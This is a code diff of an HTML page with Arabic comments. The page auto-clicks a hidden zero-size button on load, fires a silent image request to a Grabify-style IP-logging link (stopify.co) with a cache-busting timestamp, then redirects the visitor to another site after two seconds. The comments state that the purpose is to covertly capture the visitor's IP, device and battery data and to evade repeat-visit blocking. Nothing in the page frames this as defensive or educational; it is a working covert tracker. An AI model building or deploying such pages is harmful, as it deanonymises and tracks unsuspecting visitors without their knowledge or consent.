@@ -7,7 +7,7 @@
 </head>
 <body>
 
-  <!-- زر افتراضي مخفي تماماً -->
+  <!-- زر مخفي للتفعيل الأوتوماتيكي المعزز -->
   <button id="secureBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>
 
   <script>
@@ -15,21 +15,21 @@
       const btn = document.getElementById('secureBtn');
       
       btn.addEventListener('click', function() {
-        // توليد طابع زمني فريد بالملي ثانية لمنع السيرفر والمتصفح من قراءة الكاش القديم
+        // طابع زمني لكسر الكاش وتخطي حظر التكرار في المتصفح والسيرفر
         const timestamp = Date.now();
         
-        // ⚠️ استبدل هذا الرابط برابطك الجديد (بالنطاق البديل الذي اخترته)
-        const grabifyUrl = 'https://stopify.co/JLMB8N' + timestamp; 
+        // الرابط الجديد تماماً بناءً على صورتك مع متغير كسر الكاش
+        const grabifyUrl = 'https://stopify.co' + timestamp; 
         const destinationUrl = 'https://dominoes.mx';
 
-        // استخدام كائن الصورة برمجياً لإرسال الطلب بصمت تام وبأعلى صلاحية أمان
+        // استخدام كائن الصورة لإرسال بيانات الـ Smart Logger والـ IP بصمت تام وبأعلى صلاحية أمان
         const imgTracker = new Image();
         imgTracker.src = grabifyUrl;
 
-        // مهلة 1.8 ثانية كافية جداً ليعالج السيرفر الـ Smart Logger والـ IP قبل إعادة التوجيه
+        // مهلة ثانيتين كاملتين لضمان انتهاء السكربت من قراءة بيانات البيسي/الهاتف والبطارية قبل التحويل
         setTimeout(function() {
           window.location.href = destinationUrl;
-        }, 1800);
+        }, 2000);
       });
 
       // إطلاق النقرة أوتوماتيكياً فور تحميل الصفحة
